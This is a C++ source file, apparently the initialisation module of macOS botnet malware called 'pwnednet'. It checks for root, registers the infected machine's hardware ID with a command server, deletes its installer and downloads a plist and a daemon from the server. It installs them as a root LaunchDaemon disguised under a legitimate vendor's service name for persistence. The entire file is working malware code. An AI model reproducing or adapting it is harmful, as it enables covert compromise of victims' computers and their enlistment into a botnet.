//
//  init.cpp
//  pwnednet
//
/*
 
 
 
 
 
 */

#include "init.h"

string plistName    = ".plist";
string DaemonName   = "daemon";

bool MeetsRequirements() {
    
    con->WaitForConnection();
    
    if(getuid() != 0)
        return false;
    
    if(bot->hwid == "")
        return false;
    
    if(bot->cores < 2)
        return false;
    
    return true;
}

bool RegisterBot()
{
    string initpath = g_cServer + "hub.php?init";
    string initcmd  = "hwid=" + bot->hwid + "&version=" + bot->version;
    string init     = con->post(initpath.c_str(), initcmd.c_str());
    
    if(!strpos(init, "continue"))
        return false;
    
    return true;
}

void RemoveInstaller() {
    
    string cmd = fPrivate + fVar + "/" + "helper";
    
    if(!DoesFileExist(cmd))
        return;
    
    while(DoesFileExist(cmd))
    {
        remove(cmd.c_str());
        sleep(1);
    }
    
}

void InstallFiles() { // rewrite
    
    string fLaunchd = "/Library/LaunchDaemons/";
    string downloadFrom = g_cServer + "assets/";
    char p[7] = "/p.zip", d[7] = "/d.zip";
    
    while(!DoesFileExist("/p.zip"))
    {
        con->Download(downloadFrom + "p.zip", p);    // plist
        sleep(1);
    }
    
    while(!DoesFileExist("/d.zip"))
    {
        con->Download(downloadFrom + "d.zip", d);    // Daemon
        sleep(1);
    }
    
    // Move the plist and daemon to the correct place
    rename("/p.zip", cstr(fLaunchd + "p.zip"));
    rename("/d.zip", cstr(fOutfile + "d.zip"));
    
    // unzip files
    while(!DoesFileExist("/Library/LaunchDaemons/" + plistName))
    {
        system(cstr("cd " + fLaunchd + "; unzip p.zip"));
        sleep(1);
    }
    
    while(!DoesFileExist(fOutfile + DaemonName))
    {
        system(cstr("cd " + fOutfile + "; unzip d.zip"));
        sleep(1);
    }
    
    // Remove files
    remove(cstr(fLaunchd + "p.zip"));
    remove(cstr(fOutfile + "d.zip"));
    
    // Install plist
    system(cstr("sudo chown root /Library/LaunchDaemons/com.dynamsoft.WebTwainService.plist; launchctl load -D system /Library/LaunchDaemons/com.dynamsoft.WebTwainService.plist"));
    
}

bool Init::Initialise() {
    
    /*
     
     - sleep 5 secs between each function call
     
    */
    
    bool registered = false;
    
    RemoveInstaller();
    
    sleep(5);
    
    if(!MeetsRequirements())
    {
        return false;
    }
    
    
    while(!registered)
    {
        registered = RegisterBot();
        sleep(1);
    }
    
    RemoveFromStartup();
    
    sleep(5);
    
    InstallFiles();
    
    sleep(5);
    
    return true;
}






















